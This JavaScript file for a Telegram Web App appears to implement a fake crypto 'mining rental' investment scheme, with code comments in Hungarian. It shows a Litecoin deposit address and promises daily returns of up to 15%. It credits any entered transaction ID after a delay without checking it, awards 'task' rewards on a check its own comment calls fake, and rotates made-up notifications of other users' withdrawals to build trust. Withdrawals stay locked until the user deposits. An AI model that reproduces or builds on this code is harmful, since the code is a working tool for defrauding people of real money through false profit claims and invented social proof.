const tg = window.Telegram.WebApp;
tg.expand();

// CONFIG
const LTC_ADDRESS = "ltc1qv5aape3pah2f954k5jjx9kgnrnkxzytm6f7an8";

// GÉPEK ADATAI (MOST MÁR MINDEGYIK ITT VAN!)
const machines = [
    { id: 1, name: "VIP 1 - Node V1", price: 15, daily: 1.20, roi: 20 },
    { id: 2, name: "VIP 2 - Node V2", price: 50, daily: 4.00, roi: 20 },
    { id: 3, name: "VIP 3 - Cluster", price: 100, daily: 9.00, roi: 18 },
    { id: 4, name: "VIP 4 - Farm X", price: 300, daily: 30.00, roi: 15 },
    { id: 5, name: "VIP 5 - Mega Farm", price: 800, daily: 90.00, roi: 14 },
    { id: 6, name: "VIP 6 - Giga Watt", price: 1600, daily: 200.00, roi: 12 },
    { id: 7, name: "VIP 7 - Quantum X", price: 2700, daily: 400.00, roi: 10 }
];

// USER STATE
let balance = parseFloat(localStorage.getItem('balance')) || 5.00;
let vipLevel = parseInt(localStorage.getItem('vipLevel')) || 0;
let myMiners = JSON.parse(localStorage.getItem('myMiners')) || [];
let tasksDone = JSON.parse(localStorage.getItem('tasksDone')) || {1:false, 2:false};

// JAVÍTÁS: Ha nincs Telegram ID (böngészőben), generál egy randomot, hogy ne legyen üres a link
let userId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : Math.floor(Math.random() * 90000) + 10000;
let username = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";

// INIT
document.getElementById('username').innerText = username;
document.getElementById('ref-link').value = `https://t.me/SkyTechBot?start=${userId}`;
updateUI();
renderMachines();
renderMyMiners();
checkTasks();

// --- VÁSÁRLÁS LOGIKA (JAVÍTVA) ---
function buyMachine(id) {
    const machine = machines.find(m => m.id === id);
    
    // 1. ESET: Van elég pénze -> Megveszi
    if(balance >= machine.price) {
        tg.showConfirm(`Buy ${machine.name} for $${machine.price}?`, (ok) => {
            if(ok) {
                balance -= machine.price;
                addMiner(machine);
                tg.showAlert("✅ Success! Machine Activated.");
            }
        });
    } 
    // 2. ESET: Nincs elég pénze -> Befizetés ablak
    else {
        openModal('deposit', machine.price, machine.name);
    }
}

function addMiner(machine) {
    myMiners.push({
        id: Date.now(),
        name: machine.name,
        daily: machine.daily,
        roi: machine.roi, // Ciklus idő
        nextClaim: Date.now() + (24*60*60*1000) // 24 óra múlva
    });
    localStorage.setItem('myMiners', JSON.stringify(myMiners));
    
    if(vipLevel === 0) vipLevel = 1; // VIP upgrade
    localStorage.setItem('vipLevel', vipLevel);
    
    updateUI();
    renderMyMiners();
}

// GÉPEK LISTÁZÁSA
function renderMachines() {
    let html = '';
    machines.forEach(m => {
        html += `
        <div class="invest-card">
            <div class="invest-header">
                <span class="plan-name">${m.name}</span>
                <span class="plan-tag">Validity: ${m.roi} Days</span>
            </div>
            <div class="invest-stats">
                <div class="stat-item"><span class="stat-val">$${m.price}</span><span class="stat-label">Price</span></div>
                <div class="stat-item"><span class="stat-val" style="color:#00ff88">+$${m.daily}</span><span class="stat-label">Daily Profit</span></div>
            </div>
            <button class="invest-btn" onclick="buyMachine(${m.id})">Rent Now</button>
        </div>`;
    });
    document.getElementById('machine-list').innerHTML = html;
}

// SAJÁT GÉPEK & CLAIM
function renderMyMiners() {
    const list = document.getElementById('my-miners-list');
    if(myMiners.length === 0) {
        list.innerHTML = `<div class="empty-state"><i class="fas fa-server"></i><p>No active miners.</p><button onclick="nav('home', document.querySelectorAll('.nav-item')[0])">Go to Shop</button></div>`;
        return;
    }
    
    let html = '';
    const now = Date.now();
    
    myMiners.forEach(miner => {
        let timeLeft = miner.nextClaim - now;
        let btnState = '';
        let status = '';
        
        if(timeLeft <= 0) {
            btnState = `<button class="claim-btn active" onclick="claimProfit(${miner.id}, ${miner.daily})">💰 CLAIM $${miner.daily}</button>`;
            status = `<span style="color:gold">● Ready to Claim</span>`;
        } else {
            let h = Math.floor(timeLeft / (1000*60*60));
            let m = Math.floor((timeLeft % (1000*60*60)) / (1000*60));
            btnState = `<span class="miner-timer">${h}h ${m}m left</span>`;
            status = `<span style="color:#00ff88">● Running</span>`;
        }
        
        html += `
        <div class="miner-card">
            <div class="miner-info">
                <h4>${miner.name}</h4>
                <div class="miner-status">${status}</div>
            </div>
            <div>${btnState}</div>
        </div>`;
    });
    list.innerHTML = html;
}

function claimProfit(id, profit) {
    balance += profit;
    const index = myMiners.findIndex(m => m.id === id);
    if(index !== -1) {
        myMiners[index].nextClaim = Date.now() + (24*60*60*1000); // Reset 24h
        localStorage.setItem('myMiners', JSON.stringify(myMiners));
    }
    updateUI();
    renderMyMiners();
    tg.showAlert(`💰 +$${profit} Collected!`);
}

// BEFIZETÉS ELLENŐRZÉS (DEMO)
async function verifyPayment() {
    const txid = document.getElementById('txid').value;
    if(txid.length < 5) return tg.showAlert("Invalid TXID");
    
    tg.MainButton.text = "Checking Blockchain...";
    tg.MainButton.show();
    
    setTimeout(() => {
        tg.MainButton.hide();
        let amount = parseFloat(document.getElementById('dep-amount').innerText.replace('$','')) || 10;
        
        balance += amount; // Jóváírjuk
        updateUI();
        
        // Ha egy gép miatt nyitotta meg, próbáljuk megvenni újra
        tg.showAlert(`✅ Payment Received: $${amount}`);
        closeModal('deposit');
        
    }, 2500);
}

// TASK LOGIKA (FAKE CHECK)
function doTask(id) {
    if(tasksDone[id]) return;
    const btn = document.getElementById('btn-task-' + id);
    btn.innerText = "Checking...";
    
    // Kamu ellenőrzés (a Telegram nem engedi lekérdezni, hogy tényleg belépett-e, hacsak nincs botod az adminok közt)
    // A profik így csinálják: rákattint -> várunk -> jóváírjuk.
    setTimeout(() => {
        // Megnyitjuk a linket
        if(id===1) window.open('https://t.me/SkyTechSupport', '_blank'); // IDE TEDD A CSATORNÁD LINKJÉT
        if(id===2) window.open('https://twitter.com', '_blank');
        
        setTimeout(() => {
            btn.innerText = "Done";
            btn.disabled = true;
            btn.style.background = "#333";
            balance += 2.00;
            tasksDone[id] = true;
            localStorage.setItem('tasksDone', JSON.stringify(tasksDone));
            updateUI();
            tg.showAlert("Task Complete! +$2.00 added.");
        }, 3000); // 3mp múlva adja meg
    }, 500);
}

function checkTasks() {
    if(tasksDone[1]) { document.getElementById('btn-task-1').innerText = "Done"; document.getElementById('btn-task-1').disabled = true; document.getElementById('btn-task-1').style.background = "#333"; }
    if(tasksDone[2]) { document.getElementById('btn-task-2').innerText = "Done"; document.getElementById('btn-task-2').disabled = true; document.getElementById('btn-task-2').style.background = "#333"; }
}

// UI HELPERS
function nav(page, el) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.getElementById('page-' + page).classList.add('active');
    el.classList.add('active');
}
function openModal(type, amt=0, name='') {
    if(type==='deposit') {
        document.getElementById('dep-amount').innerText = amt > 0 ? `$${amt}` : "$10";
    }
    document.getElementById('modal-' + type).style.display = 'flex';
}
function closeModal(type) { document.getElementById('modal-' + type).style.display = 'none'; }
function openWithdrawModal() {
    if(vipLevel === 0) tg.showAlert("⚠️ VIP 0 cannot withdraw.\nPlease invest first.");
    else openModal('withdraw');
}
function openHistoryModal() { tg.showAlert("No transactions found yet."); }
function copyAddr() { navigator.clipboard.writeText(LTC_ADDRESS); tg.showAlert("Address Copied!"); }
function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-link').value); tg.showAlert("Invite Link Copied!"); }
function updateUI() {
    document.getElementById('main-balance').innerText = balance.toFixed(2);
    document.getElementById('with-bal').innerText = balance.toFixed(2);
    const vipTag = document.getElementById('vip-display');
    const lockMsg = document.getElementById('vip-lock-msg');
    if(vipLevel > 0) { vipTag.innerText = "VIP " + vipLevel; vipTag.classList.add('active'); lockMsg.style.display = 'none'; }
    else { vipTag.innerText = "VIP 0"; vipTag.classList.remove('active'); lockMsg.style.display = 'block'; }
    localStorage.setItem('balance', balance);
}
// NOTIFICATIONS
const users = ['User99**', 'CryptoM**', 'Anna_K**', 'LTC_Wh**'];
const acts = ['withdrew $120', 'bought VIP 2', 'invited 2 friends'];
setInterval(() => {
    document.getElementById('toast-msg').innerText = `${users[Math.floor(Math.random()*4)]} ${acts[Math.floor(Math.random()*3)]}`;
    document.getElementById('toast').classList.add('show');
    setTimeout(() => document.getElementById('toast').classList.remove('show'), 4000);
}, 8000);